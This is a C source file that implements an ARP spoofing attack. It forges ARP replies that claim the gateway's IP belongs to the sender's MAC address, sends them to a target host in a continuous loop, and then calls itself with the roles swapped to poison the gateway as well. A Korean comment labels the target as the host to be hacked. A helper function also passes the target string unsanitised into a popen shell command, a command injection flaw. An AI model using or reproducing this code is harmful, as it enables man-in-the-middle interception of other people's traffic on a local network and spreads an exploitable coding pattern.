#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include "nethack.h"
#include "arp.h"

int mac_from_iface(int sockhw, const char* iface_name, struct ether_addr* ether_out)
{

	struct ifreq ifr;
	memset((void*) &ifr, 0, sizeof(ifr));

	strncpy(ifr.ifr_name, iface_name, sizeof(ifr.ifr_name));

	if (ioctl(sockhw, SIOCGIFHWADDR, (void*) &ifr) < 0) {
		//perror("ioctl()");
		return -1;
	}

	memcpy(ether_out->ether_addr_octet, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	return 1;
}

int livecheck_arp(char *target)
{
	FILE *fp;
	char cmd[256], buff[1024];
	int retc = 0;

	sprintf(cmd, "arp | grep %s | grep -v incomplete | wc -l", target);
	fp = popen(cmd, "r");
	if (fp == NULL)
		return 0; 

	while (fgets(buff, 1024, fp) != NULL)
	{
		if (strcmp(buff, "1\n") == 0)
		{
			retc = 1;
			break;
		}
	}

	pclose(fp);
	return retc;
}

/********************************************************************
 * target : 해킹대상IP
 * gateway : 
 *******************************************************************/
int arpspoof(char *myip, char *interface, char *target, char *gateway, int isswap)
{
	struct ether_addr iface_hwaddr;
	struct ether_addr target_hwaddr;
	struct arp_packet *arp;
	char sendr_mac[18]; /* e.g. 'aa:bb:cc:11:22:33' = 17 chars + \0 = 18 chars */
	char target_mac[18];
	int sockhw, sock, if_idx;
	int random=0, retc, ii=0;

	while (1)
	{
		sockhw = socket(AF_INET, SOCK_DGRAM, 0);
		if (sockhw < 0) {
			printf("%s\n", "socket() 1");
			return -1;
		}

		sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
		if (sock < 0) {
			printf("%s\n", "socket() 2");
			return -1;
		}

		ii = 0;
		while (1)
		{
			if (ii > 10) {
				//printf("%s reload\n", target);
				break;
			}

			if (mac_from_iface(sockhw, interface, &iface_hwaddr) < 0) {
				return -1;
			}

			if (find_mac_addr(inet_addr(target), interface, &target_hwaddr) < 0) {
				printf("%s\n", "find_mac_addr");
				sleep(10);
				continue;
			}

			memset(sendr_mac, 0, sizeof(sendr_mac));
			memset(target_mac, 0, sizeof(target_mac));

			/* sendr_mac : my ip	*/
			strncpy(sendr_mac, ether_ntoa(&iface_hwaddr), sizeof(sendr_mac));
			strncpy(target_mac, ether_ntoa(&target_hwaddr), sizeof(target_mac));

			arp = create_arp_reply_packet(sendr_mac, gateway, target_mac, target);

			if_idx = if_nametoindex(interface);
			if (if_idx == 0) {
				//perror("if_nametoindex()");
				printf("%s\n", "if_nametoindex");
				return -1;
			}

			if (send_arp_to(arp, sock, if_idx) > 0) 
			{
	//			printf("send ARP Reply: %s is at %s --to-> %s\n", gateway, sendr_mac, target);
			}

			if (isswap == 1)
				break;

			usleep(1000000);

			//random = target[strlen(target) - 1] - '0';
	//printf("random[%d]\n", random);
			//usleep(random * 30000);

#if 0
			if (live == 0)
			{
				retc = livecheck_arp(target);
				if (retc == 1)
				{
					live = 1;
					printf("%s live...\n", target);
				}
				else
				{
					interval = 3300000;
					usleep(interval);

					close(sock);
					close(sockhw);
				}
			}
#endif
			ii++;
		}

		close(sock);
		close(sockhw);

		if (isswap == 1)
		{
			break;
		}
		arpspoof(NULL, interface, gateway, target, 1);
	}
	return 0;
}
